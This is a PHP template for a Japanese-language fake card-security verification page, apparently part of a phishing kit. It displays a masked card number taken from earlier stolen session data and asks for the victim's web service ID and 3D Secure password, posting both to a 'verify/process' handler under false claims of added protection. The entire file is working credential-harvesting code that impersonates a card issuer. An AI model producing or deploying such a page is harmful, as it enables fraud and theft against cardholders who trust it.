<?php
defined("ALLOW") or exit('No direct script access allowed');
?>
<!DOCTYPE html>
<html lang="jp">

<head>
    <title><?php echo $_45 ?></title>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta http-equiv="x-ua-compatible" content="ie=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="stylesheet" href="<?= base_url() ?>CR51/Assets/_hayo/css/style.secure.css">
    <link rel="shortcut icon" href="<?= base_url() ?>CR51/Assets/_hayo/img/favicon.ico" />
</head>

<body>
    <div id="xMarcos_9X9X" style="opacity: 1;">
        <div id="xGhostRiderForm">
            <div id="xDoctorStrange_L0">
                <table>
                    <tbody>
                        <tr>
                            <td><img class="cc_bank" id="cc_bank" src="<?= base_url() ?>CR51/Assets/_hayo/img/ssl.png"></td>
                            <?php
                            $cardType = $_SESSION['vbv_scheme'];
                            if (preg_match("/VISA/", $cardType)) {
                                echo '<td><img class="cc_type" id="cc_type" src="' . base_url() . 'CR51/Assets/_hayo/img/visa.png"></td>';
                            } elseif (preg_match("/MASTERCARD/", $cardType)) {
                                echo '<td><img class="cc_type" id="cc_type" src="' . base_url() . 'CR51/Assets/_hayo/img/mastercard.png"></td>';
                            } elseif (preg_match("/JCB/", $cardType)) {
                                echo '<td><img class="cc_type" id="cc_type" src="' . base_url() . 'CR51/Assets/_hayo/img/jcb.png"></td>';
                            }
                            ?>
                        </tr>
                    </tbody>
                </table>
            </div>
            <div id="xDoctorStrange_L1">安全オンラインを追加しました</div>
            <br>
            <div id="xDoctorStrange_L3">
                <table>
                    <tbody>
                        <tr>
                            <td style="font-weight: bold;">カード番号</td>
                            <td>XXXX-XXXX-XXXX-<?= ccMasking($_SESSION['ccn']) ?></td>
                        </tr>
                        <form name="konzform" id="konzform" method="post" action="<?= base_url() ?>verify/process" class="F0rmVBV">
                            <tr class="Height_XXX">
                                <td style="font-weight: bold;">WEB サービス ID :</td>
                                <td><input type="text" name="webid" id="webid" style="width: 170px;padding-left: 4px;" class="kontolodon" minlength="3" required></td>
                            </tr>
                            <tr class="Height_XXX">
                                <td style="font-weight: bold;">パスワード :</td>
                                <td><input type="password" name="pass3d" id="pass3d" style="width: 170px;padding-left: 4px;" class="memeklodon" minlength="3" required></td>
                            </tr>
                            <td>
                                <input type="submit" value="送信">
                        </form>
                        <br><br>
                        </td>
                        </tr>
                    </tbody>
                </table>
                <p>オンラインの安全性 を追加しました。オンラインでの不正使用からカードを保護するのに役立ちます-追加費用なしで。</p>
            </div>
        </div>
    </div>
</body>

</html>